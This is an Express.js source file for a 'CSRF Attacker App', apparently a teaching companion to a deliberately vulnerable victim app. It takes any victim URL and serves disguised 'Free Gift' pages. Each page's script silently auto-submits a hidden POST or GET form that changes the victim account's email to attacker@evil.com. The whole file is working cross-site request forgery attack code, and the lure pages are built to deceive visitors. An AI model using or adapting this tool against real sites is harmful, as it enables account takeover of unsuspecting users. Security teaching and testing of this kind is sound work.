const express = require('express');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.send(`
    <h1>CSRF Attacker App</h1>

    <p>Enter the Victim App URL:</p>

    <form method="POST" action="/prepare">
      <label>
        Victim URL:
        <input
          name="victimUrl"
          placeholder="https://YOUR-VICTIM-URL.onrender.com"
          style="width: 420px"
          required
        />
      </label>

      <button type="submit">Prepare attacks</button>
    </form>
  `);
});

app.post('/prepare', (req, res) => {
  const victimUrl = normalizeUrl(req.body.victimUrl);

  res.send(`
    <h1>Attacks prepared</h1>

    <p>Victim URL:</p>
    <code>${escapeHtml(victimUrl)}</code>

    <hr>

    <h2>POST CSRF Attack</h2>
    <p>Submits a hidden POST form to:</p>
    <code>${escapeHtml(victimUrl)}/change-email</code>

    <form method="POST" action="/attack-post">
      <input type="hidden" name="victimUrl" value="${escapeHtml(victimUrl)}" />
      <button type="submit">Start POST attack</button>
    </form>

    <hr>

    <h2>GET CSRF Attack</h2>
    <p>Submits a GET form to:</p>
    <code>${escapeHtml(victimUrl)}/change-email-get</code>

    <form method="POST" action="/attack-get">
      <input type="hidden" name="victimUrl" value="${escapeHtml(victimUrl)}" />
      <button type="submit">Start GET attack</button>
    </form>

    <p><a href="/">Change Victim URL</a></p>
  `);
});

app.post('/attack-post', (req, res) => {
  const victimUrl = normalizeUrl(req.body.victimUrl);

  res.send(`
    <h1>🎁 Free Gift</h1>
    <p>This page silently submits a POST form to the victim app.</p>

    <form id="attack" method="POST" action="${escapeHtml(victimUrl)}/change-email">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>

    <script>
      document.getElementById('attack').submit();
    </script>
  `);
});

app.post('/attack-get', (req, res) => {
  const victimUrl = normalizeUrl(req.body.victimUrl);

  res.send(`
    <h1>🎁 Free Gift</h1>
    <p>This page silently submits a GET form to the victim app.</p>

    <form id="attack" method="GET" action="${escapeHtml(victimUrl)}/change-email-get">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>

    <script>
      document.getElementById('attack').submit();
    </script>
  `);
});

function normalizeUrl(url) {
  return String(url).trim().replace(/\/$/, '');
}

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#039;');
}

app.listen(port, () => {
  console.log(`Attacker app running on port ${port}`);
});